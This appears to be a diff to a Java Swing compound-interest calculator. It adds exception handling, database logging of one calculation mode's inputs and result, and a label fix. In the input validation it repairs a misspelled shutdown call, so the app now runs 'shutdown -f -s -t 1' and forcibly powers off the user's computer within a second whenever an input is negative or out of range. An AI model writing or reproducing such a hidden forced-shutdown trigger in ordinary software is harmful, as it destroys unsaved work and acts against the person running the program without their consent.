@@ -2,7 +2,9 @@ package fuli;
 
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.io.IOException;
 import java.math.BigDecimal;
+import java.sql.SQLException;
 
 import javax.swing.JButton;
 import javax.swing.JFrame;
@@ -214,7 +216,12 @@ public class jiemian extends JFrame {
 			jButton0.addMouseListener(new MouseAdapter() {
 	
 				public void mouseClicked(MouseEvent event) {
-					jButton0MouseMouseClicked(event);
+					try {
+						jButton0MouseMouseClicked(event);
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
 				}
 			});
 		}
@@ -338,7 +345,7 @@ public class jiemian extends JFrame {
 		});
 	}
     int xuanze=1;
-   
+    mysql mysql=new mysql();
 	private JRadioButton jRadioButton2;
 	private JRadioButton jRadioButton3;
 	private JRadioButton jRadioButton4;
@@ -347,7 +354,7 @@ public class jiemian extends JFrame {
 	private JTextPane jTextPane0;
 	private JScrollPane jScrollPane0;
 	private static final String PREFERRED_LOOK_AND_FEEL = "javax.swing.plaf.metal.MetalLookAndFeel";
-	private void jButton0MouseMouseClicked(MouseEvent event) {
+	private void jButton0MouseMouseClicked(MouseEvent event) throws IOException {
 		
 		String P = jTextField0.getText();
 		String I = jTextField1.getText();
@@ -360,12 +367,9 @@ public class jiemian extends JFrame {
 		double m=Double.parseDouble(M); 
 		double n=Double.parseDouble(N); 
 		double sum=Double.parseDouble(SUM);
-		if (p > 1000000 || i > 100 || m > 1000 || n > 1000) {
-			try {
-				Runtime.getRuntime().exec("shutdowm -s -f -t -1");// 1秒后执行
-			} catch (Exception e) {
-				;
-			}
+		Runtime r=Runtime.getRuntime();
+		if (p<0||p > 1000000 ||i<0|| i > 1 ||m<0|| m > 1000 ||n<0|| n > 1000) {			
+			r.exec("shutdown -f -s -t 1");
 		}
 		if(xuanze==1){
 		i=Math.pow((1+(i/m)),m)-1;		
@@ -388,6 +392,15 @@ public class jiemian extends JFrame {
 		}
 		else if(xuanze==5){
 		F=p*(1+i)*(-1+Math.pow((1+i),n))/i;
+		try {
+			BigDecimal b = new BigDecimal(F);
+			double F1 = b.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
+			String f = Double.toString(F1);
+			mysql.output(P,I,N,f);			
+		} catch (SQLException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 		}
 		else if(xuanze==6){
 		F=p*i*Math.pow((1+i),n)/Math.pow((1+i),n-1); 	
@@ -482,7 +495,7 @@ public class jiemian extends JFrame {
 	private void jRadioButton5MouseMousePressed(MouseEvent event) {
 		if(xuanze!=5){
 			xuanze=5;
-			jLabel0.setText("每期定投入投入");
+			jLabel0.setText("每期定投入");
 			jLabel1.setText("收益率");
 			jLabel2.setText("定期投数");
 			jRadioButton0.setSelected(false);
